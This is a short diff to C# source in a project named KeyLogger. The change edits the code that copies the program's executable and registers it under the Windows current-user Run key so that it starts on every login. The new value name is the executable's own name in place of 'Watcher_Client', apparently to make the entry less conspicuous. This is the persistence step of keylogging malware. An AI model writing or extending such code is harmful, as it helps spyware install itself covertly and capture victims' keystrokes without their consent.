@@ -138,7 +138,7 @@ namespace KeyLogger
                 fileInfo.CopyTo(Path.Combine(path, appExe));
 
                 RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                rk.SetValue("Watcher_Client", targetPath);
+                rk.SetValue(appExe, targetPath);
             }       
         }
     }
